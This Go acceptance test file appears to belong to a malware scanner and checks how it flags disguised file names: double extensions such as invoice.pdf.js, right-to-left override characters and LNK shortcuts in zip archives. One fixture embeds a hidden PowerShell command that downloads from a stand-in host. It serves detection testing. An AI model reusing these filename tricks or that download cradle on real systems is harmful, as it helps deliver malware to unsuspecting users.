package acceptance_test

import (
	"os"
	"path/filepath"
	"testing"
)

// lnkLike builds a harmless LNK-like blob: the LNK header magic (0x4C000000) and
// shell link CLSID, followed by a UTF-16LE command line. It is not a working shortcut.
func lnkLike(command string) []byte {
	b := []byte{0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46}
	b = append(b, make([]byte, 40)...)
	for _, r := range command {
		b = append(b, byte(r), 0)
	}
	return b
}

// writeFiles writes a harmless JavaScript file at each slash-separated path under dir.
func writeFiles(t *testing.T, dir string, names ...string) {
	t.Helper()
	for _, name := range names {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("'use strict';\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
}

// rlo is the right-to-left override character.
const rlo = "\u202e"

func TestFilenameTricks(t *testing.T) {
	tests := []struct {
		name string
		// build writes the target into dir and returns its path
		build func(t *testing.T, dir string) string
		// expectations
		wantCode   int
		wantAt     []string // "rule path:line" pairs that must be present, as rule then path
		wantAbsent []string // rules that must not appear
	}{
		{
			name: "p5-lnk-in-zip flags the decoy name and the launcher",
			build: func(t *testing.T, dir string) string {
				p := filepath.Join(dir, "invoice.zip")
				zipEntries(t, p, []zipEntry{{name: "invoice.pdf.lnk", data: lnkLike("powershell.exe -w hidden -c iwr http://sinkhole.test/p")}})
				return p
			},
			wantCode: 20,
			wantAt:   []string{"GAL-NAME-001 invoice.zip!/invoice.pdf.lnk:0", "GAL-LNK-001 invoice.zip!/invoice.pdf.lnk:0", "GAL-NAME-003 invoice.zip!/invoice.pdf.lnk:0"},
		},
		{
			name: "p5-pdf-js at the top of the target is critical",
			build: func(t *testing.T, dir string) string {
				p := filepath.Join(dir, "invoice.pdf.js")
				if err := os.WriteFile(p, []byte("console.log('harmless');\n"), 0o600); err != nil {
					t.Fatal(err)
				}
				return p
			},
			wantCode: 20,
			wantAt:   []string{"GAL-NAME-001 invoice.pdf.js:0"},
		},
		{
			name: "p5-pdf-js in the tests folder of an archive is critical",
			build: func(t *testing.T, dir string) string {
				p := filepath.Join(dir, "mail.zip")
				zipEntries(t, p, []zipEntry{{name: "tests/invoice.pdf.js", data: []byte("console.log('harmless');\n")}})
				return p
			},
			wantCode: 20,
			wantAt:   []string{"GAL-NAME-001 mail.zip!/tests/invoice.pdf.js:0"},
		},
		{
			name: "p7-json-js test file named after an API is not flagged",
			build: func(t *testing.T, dir string) string {
				writeFiles(t, dir, "test/express.json.js", "test/res.json.js", "playground/resolve/exact-extension/file.json.js")
				return dir
			},
			wantCode:   0,
			wantAbsent: []string{"GAL-NAME-001"},
		},
		{
			name: "p7-png-js in a test folder of a source tree is graded medium",
			build: func(t *testing.T, dir string) string {
				writeFiles(t, dir, "test/e2e/image-optimizer/test.png.js")
				return dir
			},
			wantCode: 10,
			wantAt:   []string{"GAL-NAME-001 test/e2e/image-optimizer/test.png.js:0"},
		},
		{
			name: "p5-rtlo-name flags the bidi control with an escaped path",
			build: func(t *testing.T, dir string) string {
				p := filepath.Join(dir, "invoice"+rlo+"fdp.exe")
				if err := os.WriteFile(p, []byte("harmless\n"), 0o600); err != nil {
					t.Skipf("filesystem rejects the file name: %v", err)
				}
				return p
			},
			wantCode: 20,
			wantAt:   []string{`GAL-NAME-002 invoice\u` + "202efdp.exe:0"},
		},
		{
			name: "benign-archive has no filename findings",
			build: func(t *testing.T, dir string) string {
				p := filepath.Join(dir, "benign.zip")
				zipOfBenignCLI(t, p)
				return p
			},
			wantCode:   0,
			wantAbsent: []string{"GAL-NAME-001", "GAL-NAME-002", "GAL-NAME-003", "GAL-LNK-001"},
		},
		{
			name: "tar.gz and multi-dot pdf names are not flagged",
			build: func(t *testing.T, dir string) string {
				p := filepath.Join(dir, "docs.zip")
				zipEntries(t, p, []zipEntry{{name: "archive.tar.gz", data: []byte("x\n")}, {name: "report.final.pdf", data: []byte("x\n")}})
				return p
			},
			wantCode:   0,
			wantAbsent: []string{"GAL-NAME-001", "GAL-NAME-002", "GAL-NAME-003", "GAL-LNK-001"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Given a target built at test time
			target := tt.build(t, t.TempDir())
			// When the agent analyzes it
			rep := analyze(t, target, tt.wantCode)
			// Then the expected findings are present and the others absent
			for _, want := range tt.wantAt {
				var rule, at string
				for i := range want {
					if want[i] == ' ' {
						rule, at = want[:i], want[i+1:]
						break
					}
				}
				if !hasFinding(rep, rule, at) {
					t.Errorf("no %s at %s in %+v", rule, at, rep.Findings)
				}
			}
			for _, f := range rep.Findings {
				for _, rule := range tt.wantAbsent {
					if f.RuleID == rule {
						t.Errorf("unexpected %s in %+v", rule, rep.Findings)
					}
				}
			}
		})
	}
}
